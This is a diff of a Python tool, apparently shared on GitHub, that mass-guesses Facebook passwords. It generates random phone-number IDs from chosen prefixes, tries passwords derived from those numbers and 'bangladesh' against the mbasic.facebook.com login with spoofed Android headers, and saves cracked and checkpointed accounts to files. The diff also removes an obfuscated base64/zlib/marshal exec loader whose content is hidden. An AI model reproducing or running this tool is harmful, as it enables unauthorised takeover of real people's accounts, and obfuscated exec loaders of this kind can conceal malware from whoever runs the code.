@@ -5,7 +5,7 @@
 #WHATSAPP : +8801566*****4
 #GITHUB : https://github.com/XESAN-VAU
 #----------------------------------------------------------------------------------------------------------
-import os,sys,time,json,random,re,string,platform,base64,uuid,marshal, base64, zlib; exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJx7zIAEmKH0ZxkgMZ2BiSGVIYVhGSMDw2pGmBJGhhTGYAZNplJLIEc62tDa0ig3Gkwb5j6aMxkqEqsQ7BzkGRCi4Bzk6OIZouAb6gskPYN9HH0VPDx9Q/00GW+xFhRl5pWsZPgMMvYXj6efn7+zq1+IgpN/5C8Om9z8lNKcVLsiNrCdDAzFICd9YGZkZLzBwNrAeoHN6yKD9xUG7wswVMQCVAAAK8Mupg=='))))
+import os,sys,time,json,random,re,string,platform,base64,uuid,marshal, base64
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
 import requests as ress
@@ -105,14 +105,14 @@ logo1 = ("""
                          """)
 
 def mumitx():
-	print('=========================================')
+	print("\033[1;91m<\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
 
 def Main():
         os.system("clear")
         print(logo)
-        print(" [A] RANDOM CRACK")
-        print(" [B] Exit")
-        Mumit =input("\n [?] Choose : ")
+        print("\033[1;35m[\033[1;32mA\033[1;35m]\033[1;32m RANDOM CRACK")
+        print("\033[1;35m[\033[1;32mB\033[1;35m]\033[1;32m Exit")
+        Mumit =input("\033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m Choose : ")
         if Mumit in ["A","01"]:
             fuck()
         if Mumit in [" B", "00"]:
@@ -124,12 +124,12 @@ def fuck():
     user=[]
     os.system('clear')
     print(logo)
-    print('[+] EXAMPLE CODE: 017, 018, 019, 016')
-    code = input('[?] CHOOSE CODE : ')
+    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m EXAMPLE CODE: 017, 018, 019, 016')
+    code = input('\033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m CHOOSE CODE : ')
     os.system('clear')
     print(logo)
-    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
-    limit = int(input('[?] CHOOSE : '))
+    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m EXAMPLE: 2000 3000 5000 10000 ')
+    limit = int(input('\033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m CHOOSE : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
@@ -137,19 +137,20 @@ def fuck():
         os.system('clear')
         print(logo1)
         tl = str(len(user))
-        print('[+] Total ids: '+tl)
-        print("[+] Your Code: "+code)
-        print('[+] Process has been started')
-        print('[+] Use flight mode for speed up')
-        print('=========================================')
+        print("\033[1;91m<\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
+        print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Total ids: '+tl)
+        print("\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Your Code: "+code)
+        print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Process has been started')
+        print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Use flight mode for speed up')
+        print("\033[1;91m<\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
         for guru in user:
             uid = code+guru
             pwx = [guru,uid,uid[:7],uid[:6],'bangladesh']
             yaari.submit(mumit2,uid,pwx,tl)
     print(mumitx)
-    print(' [+] Crack process has been completed')
-    print(' [+] OK Ids saved in ALEN/OK.txt')
-    print(' [+] CP Ids saved in ALEN/CP.txt')
+    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Crack process has been completed')
+    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m OK Ids saved in ALEN/OK.txt')
+    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m CP Ids saved in ALEN/CP.txt')
     print(mumitx)
        
 def mumit2(uid,pwx,tl):
@@ -178,18 +179,19 @@ def mumit2(uid,pwx,tl):
             'method':'GET',
             'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
             'scheme':'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
             'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"LM-G710N"',
             'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
+            'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
